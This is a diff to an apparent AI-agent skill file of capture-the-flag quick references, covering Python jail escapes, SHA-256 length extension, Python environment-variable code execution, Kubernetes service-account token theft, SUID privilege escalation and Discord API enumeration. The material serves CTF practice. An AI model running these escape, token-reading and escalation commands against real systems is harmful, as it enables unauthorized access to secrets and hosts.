@@ -1,6 +1,6 @@
 ---
 name: ctf-misc
-description: Miscellaneous CTF challenge techniques. Use for encoding puzzles, RF/SDR signal processing, Python/bash jails, DNS exploitation, unicode steganography, floating-point tricks, or challenges that don't fit other categories.
+description: Miscellaneous CTF challenge techniques. Use for encoding puzzles, RF/SDR signal processing, Python/bash jails, DNS exploitation, unicode steganography, floating-point tricks, QR codes, audio challenges, Z3 constraint solving, Kubernetes RBAC, WASM game patching, esoteric languages, or challenges that don't fit other categories.
 license: MIT
 allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
 metadata:
@@ -15,10 +15,10 @@ Quick reference for miscellaneous CTF challenges. Each technique has a one-liner
 
 - [pyjails.md](pyjails.md) - Python jail/sandbox escape techniques
 - [bashjails.md](bashjails.md) - Bash jail/restricted shell escape techniques
-- [encodings.md](encodings.md) - Encodings, QR codes, audio, esolangs, SHA-256 length extension, UTF-16 tricks
+- [encodings.md](encodings.md) - Encodings, QR codes, esolangs, Verilog/HDL, UTF-16 tricks, BCD encoding, multi-layer auto-decoding
 - [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ signal processing (QAM-16, carrier recovery, timing sync)
 - [dns.md](dns.md) - DNS exploitation (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling)
-- [games-and-vms.md](games-and-vms.md) - WASM patching, PyInstaller, marshal, Python env RCE, Z3, K8s RBAC
+- [games-and-vms.md](games-and-vms.md) - WASM patching, Roblox place file reversing, PyInstaller, marshal, Python env RCE, Z3, K8s RBAC, floating-point precision exploitation
 
 ---
 
@@ -71,36 +71,7 @@ print(flag.decode())
 
 ## USB Mouse PCAP Reconstruction
 
-**Pattern (Hunt and Peck):** USB HID mouse traffic captures on-screen keyboard typing.
-
-**Workflow:**
-1. Open PCAP in Wireshark -- identify USBPcap with HID interrupt transfers
-2. Identify device (Device Descriptor -> manufacturer/product)
-3. Use USB-Mouse-Pcap-Visualizer: `github.com/WangYihang/USB-Mouse-Pcap-Visualizer`
-4. Extract click coordinates (falling edges of `left_button_holding`)
-5. Plot clicks on scatter plot with matplotlib
-6. Overlay on image of Windows On-Screen Keyboard
-7. Animate clicks in order to read typed text
-
-**Key details:**
-- Mouse reports **relative** coordinates (deltas), not absolute
-- Cumulative sum of deltas gives position track
-- Rising/falling edges of button state = click start/end
-- Need to scale/stretch overlay to match OSK layout
-
-```python
-import pandas as pd
-import matplotlib.pyplot as plt
-
-df = pd.read_csv('mouse_data.csv')
-# Find click positions (falling edges)
-clicks = df[df['left_button_holding'].shift(1) == True & (df['left_button_holding'] == False)]
-# Cumulative position from relative deltas
-x_pos = df['x'].cumsum()
-y_pos = df['y'].cumsum()
-# Plot clicks over OSK image
-plt.scatter(click_x, click_y, c='red', s=50)
-```
+**Pattern (Hunt and Peck):** USB HID mouse traffic captures on-screen keyboard typing. Use USB-Mouse-Pcap-Visualizer, extract click coordinates (falling edges), cumsum relative deltas for absolute positions, overlay on OSK image.
 
 ## File Type Detection
 
@@ -164,220 +135,46 @@ r.interactive()
 
 ## Python Jail Quick Reference
 
-**Enumerate functions:**
-```python
-for c in string.printable:
-    result = test(f"{c}()")
-    if "error" not in result.lower():
-        print(f"Found: {c}()")
-```
+- **Oracle pattern:** `L()` = length, `Q(i,x)` = compare, `S(guess)` = submit. Linear or binary search.
+- **Walrus bypass:** `(abcdef := "new_chars")` reassigns constraint vars
+- **Decorator bypass:** `@__import__` + `@func.__class__.__dict__[__name__.__name__].__get__` for no-call, no-quotes escape
+- **String join:** `open(''.join(['fl','ag.txt'])).read()` when `+` is blocked
 
-**Oracle pattern (L, Q, S functions):**
-```python
-flag_len = int(test("L()"))
-for i in range(flag_len):
-    for c in range(32, 127):
-        if query(i, c) == 0:
-            flag += chr(c)
-            break
-```
+See [pyjails.md](pyjails.md) for full techniques.
 
-**Bypass character restrictions:**
-```python
-# Walrus operator
-(abcdef := "new_allowed_chars")
-
-# Octal escapes
-'\141' = 'a'
-```
-
-**Decorator bypass (ast.Call banned, no quotes, no `=`):**
-```python
-# Decorators = function calls + assignment without ast.Call or =
-# function.__name__ = strings without quotes
-# See pyjails.md "Decorator-Based Escape" for full technique
-@__import__
-@func.__class__.__dict__[__name__.__name__].__get__  # name extractor
-def os():
-    0
-# Result: os = __import__("os")
-```
-
-**String join bypass (`+` blocked):** `open(''.join(['fl','ag.txt'])).read()` -- see [pyjails.md](pyjails.md) for more.
-
-## Z3 Constraint Solving
+## Z3 / Constraint Solving
 
 ```python
 from z3 import *
-
 flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
 s = Solver()
-s.add(flag[0] == ord('f'))  # Known prefix
-# Add constraints...
-if s.check() == sat:
-    print(bytes([s.model()[f].as_long() for f in flag]))
+# Add constraints, check sat, extract model
 ```
 
-See [games-and-vms.md](games-and-vms.md) for YARA rules with Z3 and type systems as constraints.
+See [games-and-vms.md](games-and-vms.md) for YARA rules, type systems as constraints.
 
 ## Hash Identification
 
-**By constants:**
-- MD5: `0x67452301`
-- SHA-256: `0x6a09e667`
-- MurmurHash64A: `0xC6A4A7935BD1E995`
+MD5: `0x67452301` | SHA-256: `0x6a09e667` | MurmurHash64A: `0xC6A4A7935BD1E995`
 
 ## SHA-256 Length Extension Attack
 
-**Pattern:** MAC = `SHA-256(SECRET || message)` with known message and hash. Forge valid MAC without knowing SECRET.
+MAC = `SHA-256(SECRET || msg)` with known msg/hash -> forge valid MAC via `hlextend`. Vulnerable: SHA-256, MD5, SHA-1. NOT: HMAC, SHA-3.
 
 ```python
 import hlextend
 sha = hlextend.new('sha256')
 new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
-new_hash = sha.hexdigest()
 ```
 
-Vulnerable: SHA-256, MD5, SHA-1. NOT vulnerable: HMAC, SHA-3. See [encodings.md](encodings.md) for full attack steps.
+## Technique Quick References
 
-## PyInstaller Extraction
-
-```bash
-python pyinstxtractor.py packed.exe
-# Look in packed.exe_extracted/
-```
-
-See [games-and-vms.md](games-and-vms.md) for opcode remapping and marshal analysis.
-
-## Marshal Code Analysis
-
-```python
-import marshal, dis
-with open('file.bin', 'rb') as f:
-    code = marshal.load(f)
-dis.dis(code)
-```
-
-## Python Environment RCE
-
-```bash
-PYTHONWARNINGS=ignore::antigravity.Foo::0
-BROWSER="/bin/sh -c 'cat /flag' %s"
-```
-
-See [games-and-vms.md](games-and-vms.md) for other dangerous env vars and full explanation.
-
-## WASM Game Exploitation via Patching
-
-**Pattern:** Game with unbeatable AI in WASM. Patch minimax to play badly, proofs still validate.
-
-```bash
-wasm2wat main.wasm -o main.wat
-# Flip bestScore init and comparison operator
-wat2wasm main.wat -o main_patched.wasm
-```
-
-See [games-and-vms.md](games-and-vms.md) for full exploitation code and JS integration.
-
-## Floating-Point Precision Exploitation
-
-**Pattern (Spare Me Some Change):** Trading/economy games where large multipliers amplify tiny floating-point errors.
-
-**Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.
-
-### Finding Exploitable Values
-```python
-mult = 1000000000000000  # 10^15
-
-# Find values where multiplication creates useful fractional errors
-for i in range(1, 100):
-    x = i / 100.0
-    result = x * mult
-    frac = result - int(result)
-    if frac > 0:
-        print(f'x={x}: {result} (fraction={frac})')
-
-# Common values with positive fractions:
-# 0.07 -> 70000000000000.0078125
-# 0.14 -> 140000000000000.015625
-# 0.27 -> 270000000000000.03125
-# 0.56 -> 560000000000000.0625
-```
-
-### Exploitation Strategy
-1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
-2. **Find favorable FP error**: Value where `x * mult` has positive fraction
-3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"
-
-**Example (time-travel trading game):**
-```
-Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
-Multiplier: 1e15 (time travel)
-
-# Buy 0.56, travel through time:
-balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
-inventory = 0.56 * 1e15 = 560000000000000.0625
-
-# Sell exactly 560000000000000 (integer part):
-balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
-inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee
-
-# Now: balance >= flag_price AND inventory >= fee
-```
-
-### Why It Works
-- Float64 has ~15-16 significant digits precision
-- `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
-- `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
-- The asymmetric rounding gives you slightly more total value than you started with
-
-### Red Flags in Challenges
-- "Time travel amplifies everything" (large multipliers)
-- Trading games with buy/sell + special actions
-- Decimal currency with fees or thresholds
-- "No decimals allowed" after certain operations (forces integer transactions)
-- Starting values that seem impossible to win with normal math
-
-### Quick Test Script
-```python
-def find_exploit(mult, balance_needed, inventory_needed):
-    """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
-    for i in range(1, 500):
-        x = i / 100.0
-        if x >= 5.0:  # Can't buy more than balance
-            break
-        inv_after = x * mult
-        bal_after = (5.0 - x) * mult
-
-        # Sell integer part of inventory
-        sell = int(inv_after)
-        final_bal = bal_after + sell
-        final_inv = inv_after - sell
-
-        if final_bal >= balance_needed and final_inv >= inventory_needed:
-            print(f'EXPLOIT: buy {x}, sell {sell}')
-            print(f'  final_balance={final_bal}, final_inventory={final_inv}')
-            return x
-    return None
-
-# Example usage:
-find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
-```
-
-## Kubernetes RBAC Bypass
-
-**Pattern (CTFaaS):** Container deployer with claimed ServiceAccount isolation.
-
-**Attack chain:** Deploy probe -> read SA token -> impersonate deployer -> hostPath mount -> extract kubeconfig -> read secrets.
-
-```bash
-# From inside pod:
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-curl -k -H "Authorization: Bearer $TOKEN" \
-  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
-```
-
-See [games-and-vms.md](games-and-vms.md) for full attack chain and K8s privilege escalation checklist.
+- **PyInstaller:** `pyinstxtractor.py packed.exe`. See [games-and-vms.md](games-and-vms.md) for opcode remapping.
+- **Marshal:** `marshal.load(f)` then `dis.dis(code)`. See [games-and-vms.md](games-and-vms.md).
+- **Python env RCE:** `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER="cmd"`. See [games-and-vms.md](games-and-vms.md).
+- **WASM patching:** `wasm2wat` -> flip minimax -> `wat2wasm`. See [games-and-vms.md](games-and-vms.md).
+- **Float precision:** Large multipliers amplify FP errors into exploitable fractions. See [games-and-vms.md](games-and-vms.md).
+- **K8s RBAC bypass:** SA token -> impersonate -> hostPath mount -> read secrets. See [games-and-vms.md](games-and-vms.md).
 
 ## 3D Printer Video Nozzle Tracking (LACTF 2026)
 
@@ -391,6 +188,61 @@ See [games-and-vms.md](games-and-vms.md) for full attack chain and K8s privilege
 # 4. Filter for moves with extrusion (head moving while printing)
 # 5. Plot as 2D scatter/histogram -> letters appear
 ```
+
+## Discord API Enumeration (0xFun 2026)
+
+**Pattern (Insanity 1 & 2):** Flags hidden in Discord server metadata not visible in normal UI.
+
+**Hiding spots:**
+- Role names
+- Animated GIF emoji (flag in 2nd frame with tiny duration)
+- Message embeds
+- Server description, stickers, events
+
+```bash
+# Enumerate with user token
+TOKEN="your_token"
+# List roles
+curl -H "Authorization: $TOKEN" "https://discord.com/api/v10/guilds/GUILD_ID/roles"
+# List emojis
+curl -H "Authorization: $TOKEN" "https://discord.com/api/v10/guilds/GUILD_ID/emojis"
+# Search messages
+curl -H "Authorization: $TOKEN" "https://discord.com/api/v10/guilds/GUILD_ID/messages/search?content=flag"
+```
+
+**Animated emoji:** Download GIF, extract frames — hidden data in brief frames invisible at normal speed.
+
+---
+
+## SUID Binary Exploitation (0xFun 2026)
+
+```bash
+# Find SUID binaries
+find / -perm -4000 2>/dev/null
+
+# Cross-reference with GTFObins
+# xxd with SUID: xxd flag.txt | xxd -r
+# vim with SUID: vim -c ':!cat /flag.txt'
+```
+
+**Reference:** https://gtfobins.github.io/
+
+---
+
+## Linux Privilege Escalation Quick Checks
+
+```bash
+# GECOS field passwords
+cat /etc/passwd  # Check 5th colon-separated field
+
+# ACL permissions
+getfacl /path/to/restricted/file
+
+# Sudo permissions
+sudo -l
+```
+
+---
 
 ## Useful One-Liners
 
